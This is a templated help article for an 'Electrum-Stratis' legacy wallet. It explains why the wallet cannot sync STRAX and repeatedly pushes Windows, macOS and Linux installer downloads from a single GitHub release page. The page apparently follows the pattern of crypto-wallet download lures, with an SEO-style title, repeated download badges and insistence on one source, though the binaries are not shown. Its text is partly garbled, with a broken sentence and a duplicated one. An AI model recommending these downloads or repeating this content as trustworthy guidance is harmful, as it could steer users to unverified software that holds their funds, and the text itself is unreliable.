![Electrum-Stratis](assets/banner-article.png)

# STRAX wallet for Windows not syncing: this wallet cannot hold STRAX

<p align="center">The wrong chain, not a broken sync</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Electrum Stratis serves the legacy Stratis chain, so it cannot sync STRAX at all - not because of a setting, but because STRAX lives on a different chain with different parameters. A STRAX wallet on Windows is a different application, and a legacy wallet showing zero is behaving correctly. Before troubleshooting a sync, confirm which asset you actually hold. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What you are running | What it can hold | Why it will not sync STRAX |
|---|---|---|
| Electrum Stratis | Legacy STRAT | Different chain, different coin parameters |
| A STRAX wallet application | STRAX | Its own chain and its own peers |
| A legacy wallet restored with a STRAX seed | Nothing | The seed derives STRAT addresses, not STRAX ones |
| A "Stratis" wallet from a store | Unknown provenance | Not this project, not verifiable |

</div>

The legacy-chain banner exists for this exact confusion: it names the chain the wallet serves and the asset it does not hold, and it can be dismissed and retrieved later.

## Why it happens

A migration creates a second chain, and a second chain is not a network setting - it is a different genesis block, a different address format and a different peer network. No configuration turns one into the other, and no restore crosses the boundary, because the derivation produces addresses for the chain the software is built for.

The naming makes this worse. "Stratis wallet" describes both eras, and a user who searches for a STRAX wallet can land on a legacy build without noticing. The symptom is identical in both directions: a wallet that connects to nothing, or connects and shows an empty balance. Neither is a fault; both are the boundary doing its job.

The maintained build, current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), states which chain it serves rather than leaving the question to inference.

## Fix

1. **Identify the asset.** Check the address format and the chain an explorer shows the coins on. Legacy addresses have their own prefix, and the explorer names the network.
2. **Match the application to the asset.** Legacy STRAT belongs in this wallet or another legacy build; STRAX needs a wallet for the current chain. Installing one does not make it hold the other.
3. **Stop troubleshooting the wrong wallet.** A legacy build will never sync STRAX, so connection fixes, server additions and reinstalls all fail identically. Recognising that early saves hours.
4. **If you hold both, keep them separate.** Two wallets, two folders, two labels. Mixing them on one machine is how a send goes to the wrong chain.
5. **If a store listing offered a "Stratis" wallet, treat it as unverified.** The project distributes through its release page; a store package is someone else's build and cannot be matched to a published checksum.

If the coins are on the current chain, the answer is a wallet for that chain; if they are on the legacy chain, this wallet is the right tool and any sync problem is an ordinary peer problem.

## If that did not work

If a legacy wallet will not connect at all, work the connection path: health panel, server probe, SSL setting, alternate network. That is a normal diagnosis and it is covered step by step elsewhere.

If an explorer shows STRAX at an address and the legacy wallet shows nothing, nothing is wrong with either: the address belongs to the other chain, and the wallet is correctly blind to it.

If someone offers to move STRAX into a legacy wallet for a fee, they are describing a cross-chain transfer with a counterparty, not a wallet feature. No setting performs it, and the offer carries the usual risks of handing over funds to a stranger who has every reason to disappear. The same applies to anyone offering to "activate" a legacy balance: activation is not a thing, and a balance that does not appear is either a [the Electrum Stratis not-connected message](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/wallet-says-not-connected.md) or [three causes of a missing Electrum Stratis balance](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md). No setting performs it, and the offer carries the usual risks of handing over funds.

## Prevention

- Check the chain before installing anything called a Stratis wallet.
- Keep legacy and current assets in separate wallets with separate labels.
- Verify addresses before every send, on both sides.
- Download only from the matching project's release page.
- Read the legacy-chain banner once, so the boundary is known before it matters.
- Confirm the chain before troubleshooting a sync; the wrong wallet fails identically every time.
- If you hold both assets, keep two wallets with two labels on the same machine, so a send can never be aimed at the wrong chain by muscle memory.

## FAQ

### Why is my STRAX wallet on Windows not syncing?

Because a wallet for STRAX and a wallet for legacy STRAT are different applications on different chains. If you are running this wallet, it cannot sync STRAX by design; if you are running a STRAX wallet, its sync problem is a peer problem in that application.

### Can Electrum Stratis hold STRAX?

No. It derives legacy addresses and connects to legacy peers. STRAX requires a wallet for the current chain, and no import or setting changes which chain a build serves.

### I restored a STRAX seed here and see nothing. Did I lose the coins?

No. The coins are on the chain they were sent on; this wallet derives addresses for a different chain, so it cannot see them. Restore the seed in a wallet for the correct chain.

### Is the Windows build different from the others?

No - the same application is packaged for each desktop platform, and it serves the same legacy chain everywhere. Platform does not change which asset a build can hold, and the legacy chain is served identically on every desktop system the project packages for.

<!-- DOWNLOAD-BLOCK -->

Separate the two questions. Does this build connect to the legacy chain and reach a height? That answer is about this wallet. Does a STRAX balance appear anywhere in it? That answer is no, by design, and no setting changes it. Once the first answer is yes, the second is not a fault to repair but a different wallet to install.

## Related articles

- [STRAT is not STRAX](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-strat-and-strax-differ.md)
- [What Electrum Stratis actually is](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/what-this-wallet-is.md)
- [Install on Windows, step by step](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/install-on-windows-walkthrough.md)
- [Why "Not Connected" happens](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/wallet-says-not-connected.md)
